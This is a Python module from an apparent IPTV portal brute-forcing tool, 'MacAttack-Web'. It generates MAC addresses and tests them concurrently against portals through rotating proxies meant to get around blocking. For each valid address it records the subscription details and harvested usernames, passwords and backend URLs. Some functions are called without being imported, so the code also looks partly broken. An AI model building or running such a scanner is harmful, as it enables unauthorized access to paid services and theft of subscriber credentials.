"""
Multi-Portal Scanner System for MacAttack-Web v3.0
Allows scanning multiple portals simultaneously
"""
import asyncio
import threading
import time
import logging
from datetime import datetime
from typing import Dict, Any, List, Optional, Set
from collections import defaultdict

import stb

logger = logging.getLogger("MacAttack.multi_portal")

class MultiPortalScannerManager:
    """Manages multiple async scanners for different portals."""
    
    def __init__(self, config, state, socketio):
        self.config = config
        self.state = state
        self.socketio = socketio
        self.scanners = {}  # portal_id -> scanner_info
        self.running_scanners = set()
    
    def start_single_portal(self, portal_id: str, portal_url: str):
        """Start scanner for a single portal."""
        if portal_id in self.running_scanners:
            return False, "Scanner already running for this portal"
        
        # Import here to avoid circular imports
        from app import add_log
        
        # Create scanner thread for this portal
        scanner_info = {
            'portal_id': portal_id,
            'portal_url': portal_url,
            'thread': None,
            'loop': None,
            'running': False,
            'session': None,
            'start_time': time.time()
        }
        
        # Initialize portal state
        if 'portal_states' not in self.state:
            self.state['portal_states'] = {}
        
        self.state['portal_states'][portal_id] = {
            'stop_requested': False,
            'paused': False,
            'tested': 0,
            'hits': 0,
            'current_mac': None,
            'current_proxy': None,
            'portal_url': portal_url
        }
        
        scanner_info['thread'] = threading.Thread(
            target=self._run_portal_scanner_thread, 
            args=(portal_id, portal_url),
            daemon=True
        )
        scanner_info['thread'].start()
        
        self.scanners[portal_id] = scanner_info
        self.running_scanners.add(portal_id)
        
        return True, "Scanner started successfully"
    
    def stop_single_portal(self, portal_id: str):
        """Stop scanner for a single portal."""
        if portal_id not in self.running_scanners:
            return False, "No scanner running for this portal"
        
        # Set stop flags
        if 'portal_states' in self.state and portal_id in self.state['portal_states']:
            self.state['portal_states'][portal_id]['paused'] = False
            self.state['portal_states'][portal_id]['stop_requested'] = True
        
        scanner_info = self.scanners.get(portal_id)
        if scanner_info:
            scanner_info['running'] = False
            
            if scanner_info['loop'] and scanner_info['loop'].is_running():
                asyncio.run_coroutine_threadsafe(self._cleanup_portal(portal_id), scanner_info['loop'])
        
        self.running_scanners.discard(portal_id)
        
        return True, "Scanner stopped successfully"
    
    def start_all_portals(self):
        """Start scanners for all enabled portals."""
        from app import add_log
        
        portals = self.config.get('portals', [])
        enabled_portals = [p for p in portals if p.get('enabled', True)]
        
        if not enabled_portals:
            return False, "No enabled portals found"
        
        started_count = 0
        for portal in enabled_portals:
            portal_id = str(portal['id'])
            success, message = self.start_single_portal(portal_id, portal['url'])
            if success:
                started_count += 1
                add_log(self.state, f"🚀 Started scanner for {portal['name']} ({portal['url']})", "info")
        
        return True, f"Started {started_count} portal scanners"
    
    def stop_all_portals(self):
        """Stop all running portal scanners."""
        stopped_count = 0
        for portal_id in list(self.running_scanners):
            success, message = self.stop_single_portal(portal_id)
            if success:
                stopped_count += 1
        
        return True, f"Stopped {stopped_count} portal scanners"
    
    def pause_portal(self, portal_id: str):
        """Pause/unpause scanner for a specific portal."""
        if portal_id not in self.running_scanners:
            return False, "No scanner running for this portal"
        
        if 'portal_states' not in self.state:
            self.state['portal_states'] = {}
        
        if portal_id not in self.state['portal_states']:
            self.state['portal_states'][portal_id] = {'paused': False}
        
        current_paused = self.state['portal_states'][portal_id].get('paused', False)
        self.state['portal_states'][portal_id]['paused'] = not current_paused
        
        status = "paused" if not current_paused else "resumed"
        return True, f"Portal scanner {status}"
    
    def get_portal_status(self):
        """Get status of all portal scanners."""
        status = {}
        for portal_id in self.scanners:
            scanner_info = self.scanners[portal_id]
            portal_state = self.state.get('portal_states', {}).get(portal_id, {})
            
            status[portal_id] = {
                'running': portal_id in self.running_scanners,
                'paused': portal_state.get('paused', False),
                'tested': portal_state.get('tested', 0),
                'hits': portal_state.get('hits', 0),
                'current_mac': portal_state.get('current_mac'),
                'current_proxy': portal_state.get('current_proxy'),
                'portal_url': scanner_info['portal_url'],
                'start_time': scanner_info.get('start_time', 0)
            }
        
        return status
    
    def _run_portal_scanner_thread(self, portal_id: str, portal_url: str):
        """Run the async scanner for a specific portal in its own event loop."""
        from app import add_log
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        scanner_info = self.scanners[portal_id]
        scanner_info['loop'] = loop
        
        try:
            loop.run_until_complete(self._run_portal_scanner(portal_id, portal_url))
        except Exception as e:
            add_log(self.state, f"Portal scanner thread error ({portal_id}): {e}", "error")
        finally:
            loop.close()
            self.running_scanners.discard(portal_id)
    
    async def _run_portal_scanner(self, portal_id: str, portal_url: str):
        """Main scanner coroutine for a specific portal."""
        from app import ProxyScorer, RetryQueue, generate_unique_mac, add_log, save_config, save_state
        
        scanner_info = self.scanners[portal_id]
        scanner_info['running'] = True
        
        portal_state = self.state['portal_states'][portal_id]
        
        settings = self.config["settings"]
        mac_prefix = self.config["mac_prefix"]
        chunk_size = settings["chunk_size"]
        
        # Initialize portal-specific systems
        portal_proxy_scorer = ProxyScorer()
        portal_retry_queue = RetryQueue(settings["max_retries"])
        
        # Setup optimized session
        connections_per_host = settings.get("connections_per_host", 5)
        session = await stb.create_optimized_session(settings["max_workers"], connections_per_host)
        scanner_info['session'] = session
        
        try:
            add_log(self.state, f"🚀 Starting portal scanner - {portal_url} (ID: {portal_id})", "info")
            self._emit_portal_update()
            
            while not portal_state.get("stop_requested", False) and scanner_info['running']:
                # Check for pause
                if portal_state.get("paused", False):
                    add_log(self.state, f"⏸️ Portal scanner paused - {portal_url}", "warning")
                    self._emit_portal_update()
                    
                    # Wait while paused
                    while portal_state.get("paused", False) and not portal_state.get("stop_requested", False):
                        await asyncio.sleep(1)
                    
                    if portal_state.get("stop_requested", False):
                        add_log(self.state, f"⏹️ Portal scanner stop requested during pause - {portal_url}", "warning")
                        break
                    else:
                        add_log(self.state, f"▶️ Portal scanner resumed - {portal_url}", "info")
                        self._emit_portal_update()
                
                # Prepare MAC chunk
                mac_chunk = []
                
                # Priority 1: Retry queue
                while len(mac_chunk) < chunk_size and portal_retry_queue.size() > 0:
                    retry_data = portal_retry_queue.get_next()
                    if retry_data:
                        mac, retry_count, last_proxy, reason = retry_data
                        mac_chunk.append(mac)
                        add_log(self.state, f"🔄 Retrying MAC {mac} on {portal_url} (attempt {retry_count})")
                
                # Priority 2: Random generation
                while len(mac_chunk) < chunk_size:
                    mac = generate_unique_mac(mac_prefix, self.state.get("tested_macs", set()))
                    if mac:
                        mac_chunk.append(mac)
                    else:
                        break
                
                if not mac_chunk:
                    add_log(self.state, f"✅ All MACs processed for {portal_url}", "info")
                    break
                
                # Update portal state
                portal_state["current_mac"] = mac_chunk[0] if mac_chunk else None
                
                # Process chunk for this portal
                add_log(self.state, f"📦 Processing chunk of {len(mac_chunk)} MACs on {portal_url}...")
                self._emit_portal_update()
                
                chunk_hits = await self._process_portal_mac_chunk(
                    session, portal_id, portal_url, portal_state, 
                    portal_proxy_scorer, portal_retry_queue, mac_chunk
                )
                
                if chunk_hits:
                    add_log(self.state, f"🎯 Found {len(chunk_hits)} hits on {portal_url}!")
                
                # Emit updates
                self._emit_portal_update()
                
                # Auto-save periodically
                if settings.get("auto_save", True) and portal_state.get("tested", 0) % 100 == 0:
                    save_config(self.config)
                    save_state(self.state)
                
                # Brief pause between chunks
                await asyncio.sleep(0.5)
                
                # Check for stop request
                if portal_state.get("stop_requested", False):
                    add_log(self.state, f"⏹️ Portal scanner stop requested - {portal_url}", "warning")
                    break
        
        except Exception as e:
            add_log(self.state, f"❌ Portal scanner error ({portal_url}): {e}", "error")
        finally:
            await self._cleanup_portal(portal_id)
            scanner_info['running'] = False
            self._emit_portal_update()
    
    async def _cleanup_portal(self, portal_id: str):
        """Cleanup resources for a specific portal."""
        try:
            scanner_info = self.scanners.get(portal_id)
            if scanner_info and scanner_info['session'] and not scanner_info['session'].closed:
                await scanner_info['session'].close()
                scanner_info['session'] = None
        except Exception as e:
            logger.error(f"Error closing session for portal {portal_id}: {e}")
        
        # Final save
        save_config(self.config)
        save_state(self.state)
    
    async def _process_portal_mac_chunk(self, session, portal_id, portal_url, portal_state, 
                                       portal_proxy_scorer, portal_retry_queue, mac_chunk):
        """Process a chunk of MACs for a specific portal."""
        settings = self.config["settings"]
        proxies = self.config["proxies"]
        timeout = settings["timeout"]
        max_workers = min(settings["max_workers"], len(mac_chunk))
        quickscan_only = settings.get("quickscan_only", False)
        
        hits = []
        semaphore = asyncio.Semaphore(max_workers)
        
        async def process_single_mac(mac: str) -> Optional[Dict[str, Any]]:
            async with semaphore:
                # Mark MAC as tested globally
                if "tested_macs" not in self.state:
                    self.state["tested_macs"] = set()
                self.state["tested_macs"].add(mac)
                
                # Get proxy if available
                proxy = None
                if proxies and len(proxies) > 0:
                    proxy = stb._smart_rotator.get_best_proxy(proxies, portal_state.get("current_proxy"))
                    if not proxy:
                        portal_retry_queue.add_retry(mac, 0, None, "no_proxy")
                        return None
                    portal_state["current_proxy"] = proxy
                else:
                    portal_state["current_proxy"] = None
                
                # Test MAC
                start_time = time.time()
                success, result, error_type = await test_mac_worker(session, portal_url, mac, proxy, timeout, quickscan_only)
                elapsed_ms = (time.time() - start_time) * 1000
                
                # Update counters
                portal_state["tested"] = portal_state.get("tested", 0) + 1
                self.state["tested"] = self.state.get("tested", 0) + 1
                self.state["session_stats"]["session_tested"] = self.state["session_stats"].get("session_tested", 0) + 1
                
                if success:
                    # HIT!
                    portal_state["hits"] = portal_state.get("hits", 0) + 1
                    self.state["hits"] = self.state.get("hits", 0) + 1
                    self.state["session_stats"]["session_hits"] = self.state["session_stats"].get("session_hits", 0) + 1
                    
                    # Update proxy statistics only if proxy was used
                    if proxy:
                        portal_proxy_scorer.record_success(proxy, elapsed_ms)
                        stb._smart_rotator.record_success(proxy, elapsed_ms)
                    
                    # Process hit data
                    expiry = result.get("expiry", "Unknown")
                    channels = result.get("channels", 0)
                    genres = result.get("genres", [])
                    
                    # Check for German content
                    de_genres = [g for g in genres if g.upper().startswith("DE") or "GERMAN" in g.upper() or "DEUTSCH" in g.upper()]
                    has_de = len(de_genres) > 0
                    
                    hit_data = {
                        "mac": mac,
                        "expiry": expiry,
                        "channels": channels,
                        "has_de": has_de,
                        "portal": portal_url,
                        "portal_id": portal_id,
                        "time": datetime.now().strftime("%H:%M:%S")
                    }
                    
                    self.state["found_macs"].append(hit_data)
                    
                    # Add to config for persistence
                    found_entry = {
                        "mac": mac,
                        "expiry": expiry,
                        "portal": portal_url,
                        "portal_id": portal_id,
                        "channels": channels,
                        "genres": genres,
                        "has_de": has_de,
                        "de_genres": de_genres,
                        "vod_categories": result.get("vod_categories", []),
                        "series_categories": result.get("series_categories", []),
                        "backend_url": result.get("backend_url"),
                        "username": result.get("username"),
                        "password": result.get("password"),
                        "max_connections": result.get("max_connections"),
                        "created_at": result.get("created_at"),
                        "client_ip": result.get("client_ip"),
                        "found_at": datetime.now().isoformat()
                    }
                    
                    # Update or add to config
                    existing = next((i for i, m in enumerate(self.config["found_macs"]) 
                                   if m.get("mac") == mac and m.get("portal") == portal_url), None)
                    if existing is not None:
                        self.config["found_macs"][existing] = found_entry
                    else:
                        self.config["found_macs"].append(found_entry)
                    
                    de_icon = " 🇩🇪" if has_de else ""
                    add_log(self.state, f"🎯 HIT on {portal_url}! {mac} - {expiry} - {channels}ch{de_icon}", "success")
                    
                    return hit_data
                
                elif error_type:
                    # Handle errors based on whether proxy is used
                    if proxy:
                        # Proxy error - retry with different proxy
                        portal_proxy_scorer.record_fail(proxy, error_type, portal_url)
                        stb._smart_rotator.record_failure(proxy, error_type)
                        
                        portal_retry_queue.add_retry(mac, 0, proxy, error_type)
                        
                        if error_type == "dead":
                            add_log(self.state, f"💀 Proxy dead on {portal_url}: {proxy}", "error")
                        elif error_type == "blocked":
                            add_log(self.state, f"🚫 Proxy blocked on {portal_url}: {proxy}", "warning")
                        elif error_type == "slow":
                            add_log(self.state, f"🐌 Proxy slow on {portal_url}: {proxy}", "warning")
                    else:
                        # Direct connection error (no proxy)
                        if error_type == "dead":
                            add_log(self.state, f"💀 Connection failed on {portal_url}: {mac}", "error")
                        elif error_type == "blocked":
                            add_log(self.state, f"🚫 Request blocked on {portal_url}: {mac}", "warning")
                        elif error_type == "slow":
                            add_log(self.state, f"🐌 Request timeout on {portal_url}: {mac}", "warning")
                        
                        # For direct connection, don't retry as aggressively
                        if error_type == "slow":
                            portal_retry_queue.add_retry(mac, 0, None, error_type)
                
                return None
        
        # Process all MACs in chunk concurrently
        tasks = [process_single_mac(mac) for mac in mac_chunk]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Filter out None results and exceptions
        hits = [r for r in results if r is not None and not isinstance(r, Exception)]
        
        return hits
    
    def _emit_portal_update(self):
        """Emit portal status update to web clients."""
        try:
            portal_status = self.get_portal_status()
            
            # Calculate overall rates
            total_tested = sum(status.get('tested', 0) for status in portal_status.values())
            total_hits = sum(status.get('hits', 0) for status in portal_status.values())
            
            elapsed = time.time() - (self.state.get("start_time", time.time()) or time.time())
            test_rate = total_tested / elapsed if elapsed > 0 else 0
            hit_rate = (total_hits / total_tested * 100) if total_tested > 0 else 0
            
            update_data = {
                "multi_portal": True,
                "portal_status": portal_status,
                "total_tested": total_tested,
                "total_hits": total_hits,
                "test_rate": f"{test_rate:.1f}/s",
                "hit_rate": f"{hit_rate:.2f}%",
                "found_macs": self.state.get("found_macs", [])[-10:],  # Last 10 hits
                "logs": self.state.get("logs", [])[-20:],  # Last 20 logs
            }
            
            self.socketio.emit('multi_portal_update', update_data)
        except Exception as e:
            print(f"Error emitting portal update: {e}")